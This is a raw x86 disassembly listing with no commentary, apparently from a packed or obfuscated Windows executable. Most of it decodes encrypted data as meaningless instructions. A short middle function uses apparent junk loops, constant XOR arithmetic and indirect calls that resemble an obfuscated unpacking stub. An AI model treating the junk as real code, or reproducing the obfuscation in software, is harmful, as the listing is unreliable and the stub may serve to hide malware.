  41d56c:	loope  0x41d535
  41d56e:	push   ds
  41d56f:	inc    ecx
  41d570:	pop    ds
  41d571:	pop    ecx
  41d572:	popa   
  41d573:	jl     0x41d54e
  41d575:	mov    ebp,0x90e9b7c
  41d57a:	rcl    bh,0xf3
  41d57d:	fsubp  st(4),st
  41d57f:	ss mov dh,0xe2
  41d582:	xor    esi,DWORD PTR [ebx]
  41d584:	hlt    
  41d585:	daa    
  41d586:	xchg   edi,eax
  41d587:	cmc    
  41d588:	mov    ah,0x52
  41d58a:	fadd   st,st(2)
  41d58c:	ss cmp al,BYTE PTR ds:[esi-0x5e067c3b]
  41d594:	aaa    
  41d595:	gs dec ebp
  41d597:	jmp    0xa531:0xa09045b
  41d59e:	aaa    
  41d59f:	sub    DWORD PTR [esi+0xf462330],edx
  41d5a5:	dec    edx
  41d5a6:	jecxz  0x41d55c
  41d5a8:	aam    0x69
  41d5aa:	cdq    
  41d5ab:	mov    ecx,?
  41d5ad:	mov    al,ds:0x1b90f50d
  41d5b2:	dec    edx
  41d5b3:	scas   eax,DWORD PTR es:[edi]
  41d5b4:	sub    bl,BYTE PTR [ecx-0x64]
  41d5b7:	jne    0x41d62d
  41d5b9:	sbb    DWORD PTR [ebx],esp
  41d5bb:	rcl    ch,cl
  41d5bd:	sub    BYTE PTR [edx],al
  41d5bf:	aam    0x7a
  41d5c1:	jno    0x41d5c1
  41d5c3:	cs pop ebx
  41d5c5:	xchg   edx,eax
  41d5c6:	popf   
  41d5c7:	mov    eax,ds:0xc3126a90
  41d5cc:	mov    al,0x24
  41d5ce:	(bad)
  41d5d3:	and    DWORD PTR [ecx-0x6e0ae666],ebp
  41d5d9:	and    bh,dl
  41d5db:	lods   eax,DWORD PTR ss:[esi]
  41d5dd:	stos   DWORD PTR es:[edi],eax
  41d5de:	les    ecx,FWORD PTR [ecx+0x1b]
  41d5e1:	mov    al,ds:0xc49760f0
  41d5e6:	mov    edi,esp
  41d5e8:	xchg   ebx,eax
  41d5e9:	inc    esi
  41d5ea:	push   esp
  41d5eb:	mov    ds:0x79d2c7b4,al
  41d5f0:	pop    edi
  41d5f1:	push   ds
  41d5f2:	mov    edi,0xf3664ddc
  41d5f7:	add    eax,edx
  41d5f9:	test   eax,0x40c97cfe
  41d5fe:	or     BYTE PTR [ecx-0x1],dl
  41d601:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d602:	lock in al,0x26
  41d605:	mov    eax,ds:0x948323e7
  41d60a:	xchg   edx,eax
  41d60b:	mov    bh,BYTE PTR [edx-0x72b526a0]
  41d611:	mov    WORD PTR [edx],cs
  41d613:	fdivp  st(4),st
  41d615:	inc    ecx
  41d616:	add    cl,BYTE PTR [ecx+0x4d8bb84d]
  41d61c:	or     BYTE PTR [edx-0x5a1eadf],bh
  41d622:	sub    edx,ecx
  41d624:	add    edx,DWORD PTR [ebp-0x44]
  41d627:	mov    DWORD PTR [ebp-0x44],edx
  41d62a:	mov    ecx,DWORD PTR [ebp+0x8]
  41d62d:	xor    ecx,eax
  41d62f:	add    ecx,esi
  41d631:	jne    0x41b215
  41d637:	mov    ecx,DWORD PTR [ebp-0x8]
  41d63a:	xor    ecx,eax
  41d63c:	mov    eax,DWORD PTR [ebp+0x10]
  41d63f:	add    ecx,esi
  41d641:	mov    DWORD PTR [eax],ecx
  41d643:	pop    edi
  41d644:	pop    esi
  41d645:	pop    ebx
  41d646:	leave  
  41d647:	ret    0xc
  41d64a:	push   ebp
  41d64b:	mov    ebp,esp
  41d64d:	sub    esp,0x7c
  41d650:	or     ecx,0x868
  41d656:	push   esi
  41d657:	and    DWORD PTR ds:0x42862f,0x0
  41d661:	jmp    0x41d674
  41d666:	xor    eax,eax
  41d668:	or     eax,DWORD PTR ds:0x42862f
  41d66e:	inc    eax
  41d66f:	mov    ds:0x42862f,eax
  41d674:	cmp    DWORD PTR ds:0x42862f,0x1b
  41d67b:	jae    0x41d6a6
  41d681:	cmp    DWORD PTR ds:0x42862f,0x24
  41d688:	jbe    0x41d6a6
  41d68e:	jmp    0x41d6a1
  41d693:	push   DWORD PTR [ebp-0x28]
  41d696:	push   0x42865b
  41d69b:	call   DWORD PTR ds:0x4287b3
  41d6a1:	jmp    0x41d666
  41d6a6:	push   edi
  41d6a7:	mov    eax,ds:0x4282ef
  41d6ac:	mov    DWORD PTR ds:0x42866f,0x15
  41d6b6:	cmp    DWORD PTR ds:0x42866f,0x0
  41d6bd:	je     0x41d6ed
  41d6c3:	cmp    DWORD PTR ds:0x42866f,0x1f
  41d6ca:	jl     0x41d6ed
  41d6d0:	jmp    0x41d6db
  41d6d5:	call   DWORD PTR ds:0x4287b7
  41d6db:	mov    ecx,DWORD PTR ds:0x42866f
  41d6e1:	dec    ecx
  41d6e2:	mov    DWORD PTR ds:0x42866f,ecx
  41d6e8:	jmp    0x41d6b6
  41d6ed:	mov    DWORD PTR [ebp-0x24],eax
  41d6f0:	xor    eax,eax
  41d6f2:	add    eax,DWORD PTR ds:0x42868b
  41d6f8:	mov    edi,DWORD PTR ds:0x428707
  41d6fe:	sub    eax,edi
  41d700:	xor    eax,DWORD PTR [eax+edi*1]
  41d703:	mov    eax,ds:0x4283fb
  41d708:	not    DWORD PTR ds:0x428613
  41d70e:	mov    DWORD PTR [ebp-0x34],eax
  41d711:	and    DWORD PTR [ebp-0x30],0x0
  41d715:	sub    esi,0x14f1
  41d71b:	mov    DWORD PTR [ebp-0x2c],0xf89c85b0
  41d722:	mov    DWORD PTR [ebp-0x28],0xf89c85b1
  41d729:	xor    edi,edi
  41d72b:	mov    eax,DWORD PTR [ebp-0x10]
  41d72e:	mov    esi,DWORD PTR ds:0x42860b
  41d734:	add    DWORD PTR ds:0x428653,esi
  41d73a:	mov    ecx,DWORD PTR [ebp-0x10]
  41d73d:	mov    DWORD PTR ds:0x42860f,0x19
  41d747:	cmp    DWORD PTR ds:0x42860f,0x0
  41d74e:	je     0x41d783
  41d754:	cmp    DWORD PTR ds:0x42860f,0x24
  41d75b:	jge    0x41d783
  41d761:	jmp    0x41d76f
  41d766:	push   DWORD PTR [ebp-0x14]
  41d769:	call   DWORD PTR ds:0x4287bb
  41d76f:	xor    edi,edi
  41d771:	xor    edi,DWORD PTR ds:0x42860f
  41d777:	dec    edi
  41d778:	mov    DWORD PTR ds:0x42860f,edi
  41d77e:	jmp    0x41d747
  41d783:	sub    eax,ecx
  41d785:	add    DWORD PTR ds:0x42865b,ecx
  41d78b:	mov    DWORD PTR [ebp-0x10],eax
  41d78e:	sub    edi,edi
  41d790:	xor    DWORD PTR [ebp-0x10],0xf89cb5b0
  41d797:	mov    edi,DWORD PTR ds:0x42862b
  41d79d:	adc    edi,DWORD PTR ds:0x42864b
  41d7a3:	mov    DWORD PTR ds:0x42862b,edi
  41d7a9:	mov    eax,DWORD PTR [ebp-0x18]
  41d7ac:	inc    edi
  41d7ad:	mov    ecx,DWORD PTR [ebp-0x18]
  41d7b0:	and    DWORD PTR ds:0x42862f,0x0
  41d7ba:	mov    esi,DWORD PTR ds:0x42862f
  41d7c0:	inc    esi
  41d7c1:	mov    DWORD PTR ds:0x42862f,esi
  41d7c7:	cmp    DWORD PTR ds:0x42862f,0x21
  41d7ce:	jb     0x41d804
  41d7d4:	jmp    0x41d7f7
  41d7d9:	push   0x2450
  41d7de:	push   0x4280ae
  41d7e3:	push   DWORD PTR [ebp-0x20]
  41d7e6:	push   0x428083
  41d7eb:	push   DWORD PTR [ebp-0x18]
  41d7ee:	push   DWORD PTR [ebp-0x28]
  41d7f1:	call   DWORD PTR ds:0x4287bf
  41d7f7:	cmp    DWORD PTR ds:0x42862f,0x1d
  41d7fe:	jb     0x41d7ba
  41d804:	sub    eax,ecx
  41d806:	mov    DWORD PTR ds:0x428667,0x2f20
  41d810:	mov    DWORD PTR [ebp-0x18],eax
  41d813:	or     DWORD PTR [ebp-0x18],0xf89f05b0
  41d81a:	sbb    edi,edi
  41d81c:	mov    eax,DWORD PTR [ebp-0xc]
  41d81f:	xor    ecx,ecx
  41d821:	or     ecx,DWORD PTR ds:0x428697
  41d827:	mov    esi,DWORD PTR ds:0x42869f
  41d82d:	sub    ecx,esi
  41d82f:	or     ecx,DWORD PTR [ecx+esi*1]
  41d832:	mov    ecx,DWORD PTR [ebp-0xc]
  41d835:	sub    eax,ecx
  41d837:	and    DWORD PTR ds:0x42863b,0x0
  41d841:	jmp    0x41d853
  41d846:	mov    esi,DWORD PTR ds:0x42863b
  41d84c:	inc    esi
  41d84d:	mov    DWORD PTR ds:0x42863b,esi
  41d853:	cmp    DWORD PTR ds:0x42863b,0x16
  41d85a:	jae    0x41d89c
  41d860:	cmp    DWORD PTR ds:0x42863b,0x9
  41d867:	jle    0x41d89c
  41d86d:	jmp    0x41d87d
  41d872:	push   0x428083
  41d877:	call   DWORD PTR ds:0x4287c3
  41d87d:	cmp    DWORD PTR ds:0x42863b,0x8
  41d884:	jne    0x41d897
  41d88a:	mov    esi,DWORD PTR ds:0x42863b
  41d890:	inc    esi
  41d891:	mov    DWORD PTR ds:0x42863b,esi
  41d897:	jmp    0x41d846
  41d89c:	mov    DWORD PTR [ebp-0xc],eax
  41d89f:	or     DWORD PTR [ebp-0xc],0xf89c85f0
  41d8a6:	mov    eax,DWORD PTR [ebp-0x1c]
  41d8a9:	mov    ecx,DWORD PTR [ebp-0x1c]
  41d8ac:	sub    eax,ecx
  41d8ae:	mov    DWORD PTR [ebp-0x1c],eax
  41d8b1:	or     DWORD PTR [ebp-0x1c],0xf89c8590
  41d8b8:	mov    eax,DWORD PTR [ebp-0x20]
  41d8bb:	mov    ecx,DWORD PTR [ebp-0x20]
  41d8be:	sub    eax,ecx
  41d8c0:	mov    DWORD PTR [ebp-0x20],eax
  41d8c3:	mov    eax,DWORD PTR [ebp-0x2c]
  41d8c6:	mov    ecx,DWORD PTR [ebp-0x20]
  41d8c9:	mov    esi,0x75108a4
  41d8ce:	xor    eax,esi
  41d8d0:	mov    edi,0x3272ec
  41d8d5:	add    eax,edi
  41d8d7:	or     eax,ecx
  41d8d9:	mov    DWORD PTR [ebp-0x20],eax
  41d8dc:	mov    eax,DWORD PTR [ebp-0x4]
  41d8df:	mov    ecx,DWORD PTR [ebp-0x4]
  41d8e2:	sub    eax,ecx
  41d8e4:	mov    DWORD PTR [ebp-0x4],eax
  41d8e7:	or     DWORD PTR [ebp-0x4],0xf89c85bd
  41d8ee:	mov    eax,DWORD PTR [ebp-0xc]
  41d8f1:	xor    eax,esi
  41d8f3:	add    eax,edi
  41d8f5:	push   eax
  41d8f6:	mov    eax,DWORD PTR [ebp-0x10]
  41d8f9:	xor    eax,esi
  41d8fb:	add    eax,edi
  41d8fd:	push   eax
  41d8fe:	mov    eax,DWORD PTR [ebp-0x4]
  41d901:	xor    eax,esi
  41d903:	add    eax,edi
  41d905:	push   eax
  41d906:	lea    eax,[ebp-0x7c]
  41d909:	push   eax
  41d90a:	push   DWORD PTR [ebp-0x2c]
  41d90d:	push   DWORD PTR [ebp-0x28]
  41d910:	call   0x40f37f
  41d915:	test   eax,eax
  41d917:	je     0x41fca5
  41d91d:	lea    eax,[ebp-0x7c]
  41d920:	push   eax
  41d921:	mov    eax,DWORD PTR [ebp-0x28]
  41d924:	jmp    0x41fc84
  41d929:	fs popa 
  41d92b:	dec    eax
  41d92c:	mov    cs,WORD PTR [ebx+0x7b]
  41d92f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d930:	jnp    0x41d8c9
  41d932:	rol    edx,1
  41d934:	aaa    
  41d935:	aaa    
  41d936:	stos   BYTE PTR es:[edi],al
  41d937:	adc    ecx,eax
  41d939:	sub    dl,ah
  41d93b:	jge    0x41d9b7
  41d93d:	aas    
  41d93e:	pop    edi
  41d93f:	jp     0x41d9bb
  41d941:	ror    DWORD PTR [ebx],cl
  41d943:	in     eax,dx
  41d944:	je     0x41d8d5
  41d946:	and    bh,dl
  41d948:	ret    
  41d949:	adc    ch,BYTE PTR ds:0x19dbdb6c
  41d94f:	(bad)  
  41d950:	jbe    0x41d987
  41d952:	(bad)
  41d956:	in     eax,dx
  41d957:	call   DWORD PTR [edi+0xb7bb9ad]
  41d95d:	mov    DWORD PTR [ebx],ebp
  41d95f:	xchg   ebx,eax
  41d960:	sbb    bh,dh
  41d962:	mov    esp,0xfc816dd6
  41d967:	out    dx,al
  41d968:	mov    esp,DWORD PTR [ecx+ecx*4+0x7e6a2ba3]
  41d96f:	loope  0x41d9de
  41d971:	test   DWORD PTR [eax+0x42],esp
  41d974:	xor    ch,ch
  41d976:	mov    al,ds:0xf9bd9f5
  41d97b:	sub    BYTE PTR [edx],0x84
  41d97e:	cmp    al,0x66
  41d980:	xchg   ecx,eax
  41d981:	dec    eax
  41d982:	pushf  
  41d983:	add    dh,BYTE PTR [esi]
  41d985:	cdq    
  41d986:	xor    BYTE PTR [ebx+0x5eba6065],al
  41d98c:	sbb    dl,dh
  41d98e:	leave  
  41d98f:	mov    ds:0x9f91b48e,eax
  41d994:	adc    eax,0x183c4a47
  41d999:	add    ah,BYTE PTR [esi-0x16a892b6]
  41d99f:	jb     0x41d958
  41d9a1:	js     0x41d98a
  41d9a3:	pop    eax
  41d9a4:	inc    ebp
  41d9a5:	std    
  41d9a6:	jns    0x41d963
  41d9a8:	dec    esi
  41d9a9:	daa    
  41d9aa:	and    ecx,eax
  41d9ac:	retf   0x876
  41d9af:	mov    al,ds:0x7f1ed728
  41d9b4:	add    al,0x67
  41d9b6:	rol    DWORD PTR [edx-0x670784f9],1
  41d9bc:	push   ds
  41d9bd:	leave  
  41d9be:	add    DWORD PTR [edx+ecx*1+0x7939116],esp
  41d9c5:	jne    0x41d9cc
  41d9c7:	dec    ebx
  41d9c8:	cmp    al,0xff
  41d9ca:	in     al,0xad
  41d9cc:	stc    
  41d9cd:	sub    dl,BYTE PTR ds:[edx]
  41d9d0:	test   eax,0x9007e8bd
  41d9d5:	dec    eax
  41d9d6:	das    
  41d9d7:	cwde   
  41d9d8:	test   eax,0x497d5e63
  41d9dd:	adc    dh,BYTE PTR [ecx-0x3c]
  41d9e0:	aas    
  41d9e1:	mov    cl,0x1c
  41d9e3:	xlat   BYTE PTR ds:[ebx]
  41d9e4:	push   eax
  41d9e5:	xchg   DWORD PTR [ebx+0x6eaa6c5],esi
  41d9eb:	pop    ecx
  41d9ec:	mov    esi,0x88bc2df5
  41d9f1:	cmp    esp,esp
  41d9f3:	push   ebp
  41d9f4:	xchg   BYTE PTR [ecx-0x10],ch
  41d9f7:	fxch   st(7)
  41d9f9:	add    edi,DWORD PTR [ebp-0x5c]
  41d9fc:	rcl    BYTE PTR [eax],0x7b
  41d9ff:	mov    cl,0x1a
  41da01:	add    BYTE PTR [ebp+0x16],dl
  41da04:	dec    esp
  41da05:	mov    DWORD PTR [esp+ebx*2],eax
  41da08:	add    eax,0xda7f8243
  41da0d:	(bad)  
  41da0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da0f:	fsubr  st(6),st
  41da11:	outs   dx,DWORD PTR ds:[esi]
  41da12:	xchg   edx,eax
  41da13:	sbb    BYTE PTR [esi-0x42],ch
  41da16:	stos   DWORD PTR es:[edi],eax
  41da17:	iret   
  41da18:	ret    
  41da19:	jmp    0x41da98
  41da1b:	arpl   dx,dx
  41da1d:	ins    BYTE PTR es:[edi],dx
  41da1e:	sbb    al,0x96
  41da20:	pushf  
  41da21:	mov    edx,edx
  41da23:	aam    0x4b
  41da25:	pop    ebp
  41da26:	xchg   edi,eax
  41da27:	pusha  
  41da28:	gs es push eax
  41da2b:	cmp    dl,dl
  41da2d:	leave  
  41da2e:	lds    esp,FWORD PTR [ebp+0xf4c8b05]
  41da34:	sbb    DWORD PTR [esi],0x35
  41da37:	mov    eax,0x1bf045ea
  41da3c:	xor    BYTE PTR [ebp+edx*2-0x1a],ch
  41da40:	imul   ecx,DWORD PTR [ebp+0x0],0x890fe154
  41da47:	xchg   edi,eax
  41da48:	cmp    al,0x8
  41da4a:	push   edi
  41da4b:	ret    
  41da4c:	ins    BYTE PTR es:[edi],dx
  41da4d:	push   0xffffffe4
  41da4f:	or     eax,0x53b40b76
  41da54:	cmp    DWORD PTR [eax],ecx
  41da56:	mov    dh,0x3b
  41da58:	sbb    bh,BYTE PTR [edx+0x458c5040]
  41da5e:	daa    
  41da5f:	inc    eax
  41da60:	sbb    eax,0x32aadf88
  41da65:	add    BYTE PTR ds:0xe58f9f52,0xe7
  41da6c:	and    esp,DWORD PTR [eax+eiz*8+0x8]
  41da70:	push   ebp
  41da71:	mov    bh,0xd
  41da73:	inc    ecx
  41da74:	push   ebx
  41da75:	retf   0x9a1f
  41da78:	loope  0x41daf3
  41da7a:	jp     0x41daca
  41da7c:	fs jmp 0x2472:0x54679051
  41da84:	mov    edx,0x203018c9
  41da89:	push   esp
  41da8a:	sub    esp,0x52
  41da8d:	test   al,0xf7
  41da8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da90:	add    ebx,ecx
  41da92:	mov    bh,0x72
  41da94:	pop    ebx
  41da95:	popa   
  41da96:	scas   al,BYTE PTR es:[edi]
  41da97:	pop    ebx
  41da98:	and    dl,ah
  41da9a:	les    ebx,FWORD PTR [edx+0x40]
  41da9d:	outs   dx,BYTE PTR ds:[esi]
  41da9e:	push   ebx
  41da9f:	mov    dl,0x43
  41daa1:	cmp    al,0x5
  41daa3:	inc    esp
  41daa4:	adc    cl,BYTE PTR [edx+0x378e1c21]
  41daaa:	ja     0x41da35
  41daac:	pop    ecx
  41daad:	fst    QWORD PTR [edx+0x12]
  41dab0:	sbb    ebp,DWORD PTR [edx+0x22]
  41dab3:	or     al,0x54
  41dab5:	push   ebp
  41dab6:	sub    BYTE PTR [ebx+0x5008b7ba],cl
  41dabc:	dec    ebp
  41dabd:	(bad)  
  41dabe:	iret   
  41dabf:	outs   dx,BYTE PTR ds:[esi]
  41dac0:	and    eax,0xe1b55f1f
  41dac5:	push   esi
  41dac6:	pop    ebp
  41dac7:	xor    al,BYTE PTR [ebp+0x5d]
  41daca:	sbb    eax,0x523fb72
  41dacf:	test   eax,0x55029776
  41dad4:	cmp    BYTE PTR ds:0x3cdca073,ch
  41dada:	lea    ebp,[edi+0x0]
  41dadd:	das    
  41dade:	jnp    0x41db40
  41dae0:	xor    DWORD PTR [esi-0x5],ecx
  41dae3:	sub    ch,al
  41dae5:	adc    ah,BYTE PTR [esi+0x1c]
  41dae8:	adc    eax,0x7049dcdd
  41daed:	int    0xc0
  41daef:	pop    ecx
  41daf0:	add    eax,0x55d09fff
  41daf5:	push   cs
  41daf6:	jb     0x41dad0
  41daf8:	inc    edx
  41daf9:	mov    dh,0x90
  41dafb:	add    ebp,esp
  41dafd:	retf   
  41dafe:	test   BYTE PTR [edx+eax*8-0x60355ed4],dl
  41db05:	hlt    
  41db06:	pushf  
  41db07:	adc    ecx,DWORD PTR [eax+0x37]
  41db0a:	jne    0x41dac9
  41db0c:	push   ecx
  41db0d:	in     al,dx
  41db0e:	into   
  41db0f:	repz popa 
  41db11:	int    0x72
  41db13:	mov    gs,WORD PTR ds:0x67d5a98
  41db19:	stos   DWORD PTR es:[edi],eax
  41db1a:	lahf   
  41db1b:	fidiv  DWORD PTR [ebx]
  41db1d:	or     esi,DWORD PTR [eax+0x35]
  41db20:	sub    edi,DWORD PTR [ecx]
  41db22:	sub    al,0xc6
  41db24:	add    DWORD PTR [esp+eiz*8-0x30bf6b56],ecx
  41db2b:	mov    ebp,0x74ce77b0
  41db30:	pop    ebp
  41db31:	inc    ecx
  41db32:	or     BYTE PTR [edi-0x1e9a0507],dl
  41db38:	(bad)  
  41db39:	fsub   DWORD PTR [eax+ecx*4]
  41db3c:	ss cld 
  41db3e:	xor    DWORD PTR [ecx],0xffffffb3
  41db41:	or     al,0x8d
  41db43:	inc    esp
  41db44:	(bad)  
  41db45:	scas   al,BYTE PTR es:[edi]
  41db46:	mov    esp,0x4c0b1445
  41db4b:	or     ebx,eax
  41db4d:	(bad)  
  41db4e:	mov    dl,0xbd
  41db50:	std    
  41db51:	pop    ss
  41db52:	sbb    eax,DWORD PTR [edx-0x49]
  41db55:	sbb    ebx,DWORD PTR [eax-0x2dea3122]
  41db5b:	pop    ebx
  41db5c:	sub    esi,DWORD PTR [edi+ebp*8+0x529c565]
  41db63:	mov    al,ds:0x49b67936
  41db68:	in     al,dx
  41db69:	leave  
  41db6a:	jbe    0x41db1f
  41db6c:	inc    esi
  41db6d:	jne    0x41db01
  41db6f:	cs jnp 0x41dbdd
  41db72:	lods   al,BYTE PTR ds:[esi]
  41db73:	push   ds
  41db74:	cli    
  41db75:	jmp    0x41dbc9
  41db77:	mov    WORD PTR [edi],?
  41db79:	jne    0x41dbb6
  41db7b:	inc    ebp
  41db7c:	or     edx,DWORD PTR [ebx+0x3c28ae2]
  41db82:	adc    ch,BYTE PTR [edx]
  41db84:	xor    dl,BYTE PTR [ebx]
  41db86:	cdq    
  41db87:	ins    BYTE PTR es:[edi],dx
  41db88:	inc    ebp
  41db89:	push   edx
  41db8a:	inc    edx
  41db8b:	aad    0x76
  41db8d:	imul   ebp,DWORD PTR ss:[edx+0x56224609],0xb
  41db95:	mov    ch,0xe5
  41db97:	xchg   BYTE PTR [edi],dl
  41db99:	mov    eax,0x10224e22
  41db9e:	adc    al,0xd0
  41dba0:	pop    ss
  41dba1:	sbb    al,0xc9
  41dba3:	leave  
  41dba4:	jmp    0x41dbca
  41dba6:	lods   eax,DWORD PTR ds:[esi]
  41dba7:	lods   eax,DWORD PTR ds:[esi]
  41dba8:	jle    0x41db33
  41dbaa:	aam    0xcb
  41dbac:	xor    DWORD PTR [edi+0x6fd9ed7a],ebp
  41dbb2:	xchg   edx,eax
  41dbb3:	push   ebp
  41dbb4:	popf   
  41dbb5:	cmp    ebp,DWORD PTR [edx-0x7fd8fb6d]
  41dbbb:	loop   0x41dc2c
  41dbbd:	std    
  41dbbe:	jnp    0x41dbe3
  41dbc0:	retf   0xe1fa
  41dbc3:	nop
  41dbc4:	adc    dh,bh
  41dbc6:	stc    
  41dbc7:	mov    bl,0xa0
  41dbc9:	and    al,0x28
  41dbcb:	pop    edx
  41dbcc:	cmp    BYTE PTR [edi+0x65],al
  41dbcf:	not    ah
  41dbd1:	pop    edi
  41dbd2:	xlat   BYTE PTR ds:[ebx]
  41dbd3:	mov    bl,0x65
  41dbd5:	fisttp WORD PTR [edx+0x61]
  41dbd8:	sub    eax,DWORD PTR [edi-0x7a8697f]
  41dbde:	pop    ecx
  41dbdf:	dec    edi
  41dbe0:	jge    0x41dbb9
  41dbe2:	push   esi
  41dbe3:	pusha  
  41dbe4:	fs jo  0x41dc37
  41dbe7:	and    BYTE PTR [esp+ebx*1],dl
  41dbea:	adc    DWORD PTR [ecx],esp
  41dbec:	dec    esp
  41dbed:	mov    ch,0xf4
  41dbef:	out    dx,al
  41dbf0:	and    al,0x77
  41dbf2:	sbb    al,0xb6
  41dbf4:	jl     0x41dc53
  41dbf6:	mov    dl,0x36
  41dbf8:	jg     0x41dc78
  41dbfa:	out    dx,al
  41dbfb:	xlat   BYTE PTR ds:[ebx]
  41dbfc:	in     al,0x20
  41dbfe:	js     0x41dc62
  41dc00:	jno    0x41dbda
  41dc02:	popf   
  41dc03:	stc    
  41dc04:	aad    0x6a
  41dc06:	mov    esp,ss
  41dc08:	out    dx,eax
  41dc09:	dec    eax
  41dc0a:	xchg   ecx,eax
  41dc0b:	scas   al,BYTE PTR es:[edi]
  41dc0c:	mov    ebx,0x4b57da98
  41dc11:	stos   DWORD PTR es:[edi],eax
  41dc12:	sahf   
  41dc13:	sbb    BYTE PTR [eax],bh
  41dc15:	xchg   esp,eax
  41dc16:	(bad)  
  41dc17:	xor    BYTE PTR [esi],al
  41dc19:	inc    edx
  41dc1a:	sub    al,0xd7
  41dc1c:	jge    0x41dbdf
  41dc1e:	push   ds
  41dc1f:	adc    cl,BYTE PTR [ebp+0x1c]
  41dc22:	inc    ebp
  41dc23:	mov    eax,0x1553f03
  41dc28:	push   es
  41dc29:	pop    eax
  41dc2a:	shl    BYTE PTR [ecx+eax*4+0x45959aa7],0xe2
  41dc32:	pop    esi
  41dc33:	stos   BYTE PTR es:[edi],al
  41dc34:	bound  esi,QWORD PTR [edx]
  41dc36:	mov    eax,ds:0x3cebe6f9
  41dc3b:	addr16 cmp al,0x25
  41dc3e:	push   0xd4fa465
  41dc43:	retf   
  41dc44:	repnz adc ah,BYTE PTR [esp+eax*8+0x3c]
  41dc49:	adc    eax,0xe50a679d
  41dc4e:	mov    ebx,0xc73cc584
  41dc53:	or     BYTE PTR [ebx+0x43],al
  41dc56:	fadd   DWORD PTR fs:[esi+0x5a6f0b9e]
  41dc5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc5e:	or     bl,BYTE PTR [ecx-0x64]
  41dc61:	sub    DWORD PTR [edx+0x9c7a650],edi
  41dc67:	push   es
  41dc68:	mov    al,0x5a
  41dc6a:	mov    ecx,0x31cc7a9
  41dc6f:	iret   
  41dc70:	je     0x41dc5b
  41dc72:	aas    
  41dc73:	stc    
  41dc74:	pop    eax
  41dc75:	out    dx,eax
  41dc76:	and    DWORD PTR [eax+0xa60ae79],ebp
  41dc7c:	ror    DWORD PTR [esi+0x18],0xe8
  41dc80:	nop
  41dc81:	lods   al,BYTE PTR ds:[esi]
  41dc82:	push   esi
  41dc83:	int    0xbc
  41dc85:	dec    esi
  41dc86:	aam    0xd5
  41dc88:	inc    eax
  41dc89:	add    dh,BYTE PTR [edx+0x76d98228]
  41dc8f:	aas    
  41dc90:	fstp   TBYTE PTR [ecx]
  41dc92:	sbb    eax,0x1b59cd1b
  41dc97:	inc    edx
  41dc98:	data16 mov WORD PTR [ebx-0x454a44f1],es
  41dc9f:	aad    0x93
  41dca1:	mov    cl,0x1e
  41dca3:	xor    al,0x18
  41dca5:	popa   
  41dca6:	les    ecx,FWORD PTR [ebp+0x54b11143]
  41dcac:	mov    bh,0x42
  41dcae:	mov    esp,0xadda6de7
  41dcb3:	je     0x41dc70
  41dcb5:	lods   al,BYTE PTR ds:[esi]
  41dcb6:	xchg   BYTE PTR [ecx],dh
  41dcb8:	call   0xfc9d08a7
  41dcbd:	mov    eax,ds:0x31cf64
  41dcc2:	je     0x41dc85
  41dcc4:	and    dl,BYTE PTR [eax-0x37]
  41dcc7:	inc    esp
  41dcc8:	mov    dh,0x84
  41dcca:	cmp    al,0x16
  41dccc:	mov    edx,0xfdb5964c
  41dcd1:	aaa    
  41dcd2:	and    esp,DWORD PTR [esi-0x248c5b23]
  41dcd8:	xor    eax,0x12d2f0e8
  41dcdd:	jne    0x41dcdc
  41dcdf:	cmc    
  41dce0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dce1:	mov    al,0xf1
  41dce3:	jge    0x41dd56
  41dce5:	pop    ds
  41dce6:	mov    DWORD PTR [esi+0x18],0x4be4ad0b
  41dced:	adc    edi,eax
  41dcef:	xchg   edi,eax
  41dcf0:	add    esi,DWORD PTR [edi]
  41dcf2:	outs   dx,BYTE PTR gs:[esi]
  41dcf4:	cmp    bh,BYTE PTR [eax+ebp*1]
  41dcf7:	in     eax,0x5
  41dcf9:	mov    eax,ecx
  41dcfb:	in     al,dx
  41dcfc:	xor    al,0xa1
  41dcfe:	mov    bl,0xd7
  41dd00:	sub    DWORD PTR [esi],ebp
  41dd02:	sub    edx,DWORD PTR [esi]
  41dd04:	or     eax,0xcfe89205
  41dd09:	imul   eax,DWORD PTR [ebx+0x79],0xd1e1b429
  41dd10:	mov    eax,ds:0x6c104623
  41dd15:	lock cmp bl,bh
  41dd18:	dec    esi
  41dd19:	int    0x51
  41dd1b:	push   edi
  41dd1c:	shl    DWORD PTR [edx],cl
  41dd1e:	gs sub ebp,edx
  41dd21:	std    
  41dd22:	inc    esi
  41dd23:	xor    al,0x69
  41dd25:	sbb    bh,dh
  41dd27:	sub    DWORD PTR [eax-0x3756b7fd],ecx
  41dd2d:	cmp    eax,esp
  41dd2f:	aas    
  41dd30:	out    0xa3,al
  41dd32:	mov    bl,0xea
  41dd34:	ja     0x41dda7
  41dd36:	pop    ebp
  41dd37:	iret   
  41dd38:	cmp    al,BYTE PTR [edi]
  41dd3a:	inc    edx
  41dd3b:	cwde   
  41dd3c:	in     al,dx
  41dd3d:	in     eax,dx
  41dd3e:	sub    DWORD PTR [ebp-0xc],ebx
  41dd41:	nop
  41dd42:	frstor [esi+edx*2+0x5bc282df]
  41dd49:	mov    esp,DWORD PTR [ebp+edi*4-0x4d1447c7]
  41dd50:	pusha  
  41dd51:	xor    eax,0x7f5f0970
  41dd57:	mov    ebp,0x46bc61e2
  41dd5c:	or     ecx,DWORD PTR [ebp-0x1bfaaade]
  41dd62:	pop    esi
  41dd63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd64:	fst    QWORD PTR [edi]
  41dd66:	lds    ebp,FWORD PTR [ecx+ebx*1+0x4e]
  41dd6a:	adc    DWORD PTR [ebx+edx*1+0x43ef7508],ebp
  41dd71:	das    
  41dd72:	mov    ecx,0x5123ebd8
  41dd77:	out    0x85,al
  41dd79:	repnz pop edx
  41dd7b:	dec    edx
  41dd7c:	mov    ebx,0xc8c5e1f0
  41dd81:	adc    ecx,DWORD PTR [ebx]
  41dd83:	fs push ds
  41dd85:	sub    eax,0x3ecdd2a2
  41dd8a:	xchg   ecx,eax
  41dd8b:	ss dec esp
  41dd8d:	ss in  al,0xb
  41dd90:	sbb    dl,BYTE PTR [ebx-0x62]
  41dd93:	fimul  WORD PTR [eax+0x63]
  41dd96:	lods   al,BYTE PTR ds:[esi]
